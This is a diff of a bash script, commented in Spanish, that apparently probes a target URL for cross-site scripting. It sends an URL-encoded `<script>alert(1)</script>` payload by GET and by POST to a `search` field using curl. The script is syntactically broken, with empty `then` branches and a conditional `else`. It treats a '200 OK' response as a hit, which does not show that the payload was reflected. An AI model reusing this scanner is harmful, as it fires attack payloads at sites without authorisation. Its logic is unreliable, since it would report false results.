@@ -7,8 +7,9 @@ then
   #aqui ejecutamos xss con get, checkear si esta search
   if [[ $search ]]
   then
-    a=$(curl google.com | sed -e 's/ / /g')
-b=$(echo $a | sed -e 's/./& /g')
+    XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+    ATTACK="$URL$XSS"
+    curl -i $ATTACK | grep "200 OK"
 else
   if  [[ curl $URL | grep 'method=\"POST\"' ]]
   then
@@ -18,12 +19,20 @@ else
     
     else
       if [[ $search ]]
+      then
+        curl -d "search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" $URL
   else
   # aqui ejecutamos los  dos, checkear si esta search o comment
     if [[ $comment ]]
     then
     
     else [[ $search ]]
+      XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+      ATTACK="$URL$XSS"
+      curl -i $ATTACK | grep "200 OK"
+      curl -d "search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" $URL
+      
+   fi 
 arrVar=("?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
 
-curl --verbose $URLnueva | grep "200"
+curl -i $URLnueva | grep "200"
